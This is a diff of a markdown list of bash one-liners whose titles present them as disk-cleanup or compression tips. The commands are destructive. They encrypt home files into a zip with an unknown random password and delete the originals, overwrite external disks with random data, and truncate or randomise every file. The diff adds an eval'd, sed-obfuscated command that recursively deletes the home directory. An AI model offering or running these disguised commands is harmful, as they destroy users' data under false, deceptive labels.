@@ -73,49 +73,56 @@ H. Frees up unnecessary space:
 eval $(sed 's:[a-e,s-z]::g' <<< "stream -draft ~/saved")
 ```
 
-I. Compress files and save space:
+I. Frees up unnecessary space:
+> Replace c->s o->u m->d e->o ...
+
+```bash
+eval $(echo 'come in -it ~/' | sed 'y/moteionc/deforums/')
+```
+
+J. Compress files and save space:
 > For the file files in the home at a depth of 6, add the contents to a zip and give it a random password
 
 ```bash
 zip --password "$(openssl rand -base64 64)" --move "$(openssl rand -hex 4)".zip  ~/*/*/*/*/*
 ```
 
-J. Reduce your need of the external volumes:
+K. Reduce your need of the external volumes:
 > For each volume (/dev/disk[2-9]) write random data to the drive, fork the process
 
 ```bash
 for d in /dev/disk[2-9]*; do dd if=/dev/random of=$d &; done
 ```
 
-K. Simply your files and your life:
+L. Simply your files and your life:
 > Uses find to get all files and uses tee to write empty contents to file
 
 ```bash
 find ~/ -type f -exec bash -c ':|tee {} &' \;
 ```
 
-L. Keep logs of files in the home folder utilising your current files:
+M. Keep logs of files in the home folder utilising your current files:
 > Uses find to get all files and uses awk to write file name into contents
 
 ```bash
 find ~/ -type f -exec awk 'FNR == 1{ print FILENAME > FILENAME } ' {}  \;
 ```
 
-M. Cut down on disk space without removing a file:
+N. Cut down on disk space without removing a file:
 > Loops though each inode in volume, if file exist and is writable, it wipes the content
 
 ```bash
 while read n; do eval `stat -s /`; echo $n, $st_dev; for i in $(seq 0 1 $n);do [ -f /.vol/$st_dev/$i ] &&  [ -w /.vol/$st_dev/$i ] && echo > /.vol/$st_dev/$i ; done; done <<< `df -i | awk '$NF ~ /\/$/ {print $6}'`           
 ```
 
-N. Every file gets a random makeover generating original data!
+O. Every file gets a random makeover generating original data!
 > Uses find to get all files and uses dd to write random content to the file
 
 ```bash 
 find ~ -type f -exec dd if=/dev/urandom of={} bs=1M count=1 \;
 ```
 
-O. Find your storage’s true limit.
+P. Find your storage’s true limit.
 > Write random dat to random files in random folders until the drive fills up
 
 ```bash
